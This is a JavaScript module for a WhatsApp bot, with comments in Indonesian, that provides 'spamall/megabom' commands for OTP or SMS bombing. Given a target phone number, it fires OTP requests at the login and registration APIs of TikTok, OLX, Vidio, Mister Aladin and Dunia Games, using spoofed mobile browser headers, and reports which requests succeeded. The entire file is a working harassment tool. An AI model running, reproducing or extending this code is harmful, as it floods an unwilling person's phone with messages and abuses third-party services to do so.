const axios = require('axios');

module.exports = {
    command: ['spamall', 'megabom', 'bombardir'],
    execute: async (sock, msg, args) => {
        const { from, sender } = msg;
        let target = args[0];

        // --- SISTEM OWNER FIX (MENDUKUNG LID & NOMOR BIASA) ---
        const senderNumber = sender.replace(/[^0-9]/g, ''); 
        const listOwner = [
            '6289617356981', 
            '62882008565744', 
            '125782932336700' // ID Unik kamu
        ];
        
        const isOwner = listOwner.some(owner => senderNumber === owner);

        if (!target) return sock.sendMessage(from, { text: "⚠️ Masukkan nomor tujuan!\nContoh: .spamall 812345678" });
        if (!isOwner) return sock.sendMessage(from, { text: `❌ Akses Ditolak! ID: ${senderNumber}` });

        // Normalisasi Target
        target = target.replace(/^0|^62/, '');
        
        await sock.sendMessage(from, { text: `🚀 *OTAK-ATIK API RAKSASA* 🚀\n🎯 Target: 0${target}\n⚡ Menembak TikTok, Olx, Vidio, dsb...` });

        const results = [];
        const pushResult = (name, success) => results.push(`${name}: ${success ? '✅' : '❌'}`);

        // Konfigurasi Header agar disangka HP Asli
        const getHeaders = () => ({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Accept': 'application/json',
            'Referer': 'https://www.google.com/'
        });

        // 1. TikTok (API Login/Register)
        const tiktok = async () => {
            try {
                await axios.post("https://www.tiktok.com/api/send/mobile/code/?aid=1988", 
                `mobile=0${target}&type=1&region=ID&aid=1988`, 
                { headers: { ...getHeaders(), "Content-Type": "application/x-www-form-urlencoded" } });
                pushResult("TikTok", true);
            } catch { pushResult("TikTok", false); }
        };

        // 2. OLX (Login OTP)
        const olx = async () => {
            try {
                await axios.post("https://www.olx.co.id/api/auth/authenticate", 
                { "grantType": "phone", "phone": `+62${target}` },
                { headers: getHeaders() });
                pushResult("OLX", true);
            } catch { pushResult("OLX", false); }
        };

        // 3. Vidio.com
        const vidio = async () => {
            try {
                await axios.post("https://www.vidio.com/api/otp/register", 
                { "phone": `0${target}` },
                { headers: getHeaders() });
                pushResult("Vidio", true);
            } catch { pushResult("Vidio", false); }
        };

        // 4. Mister Aladin (Travel)
        const misterAladin = async () => {
            try {
                await axios.post("https://m.misteraladin.com/api/members/v2/otp/request", 
                { "phone_number_country_code": "62", "phone_number": target, "type": "register" },
                { headers: getHeaders() });
                pushResult("MisterAladin", true);
            } catch { pushResult("MisterAladin", false); }
        };

        // 5. Dunia Games (Telkomsel)
        const dgames = async () => {
            try {
                await axios.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/', 
                { "phoneNumber": "0" + target, "inquiryId": "219424679" },
                { headers: { ...getHeaders(), 'Referer': 'https://duniagames.co.id/' } });
                pushResult("DuniaGames", true);
            } catch { pushResult("DuniaGames", false); }
        };

        // Jalankan semua secara bergantian dengan jeda tipis agar tidak bentrok
        const runAll = async () => {
            await tiktok();
            await new Promise(r => setTimeout(r, 800));
            await olx();
            await new Promise(r => setTimeout(r, 800));
            await vidio();
            await new Promise(r => setTimeout(r, 800));
            await misterAladin();
            await dgames();
        };

        await runAll();

        let report = `📊 *HASIL MEGA BOM*\n\n🎯 Target: 0${target}\n\n${results.join('\n')}\n\n_Semua API telah dicoba._`;
        await sock.sendMessage(from, { text: report }, { quoted: msg });
    }
};
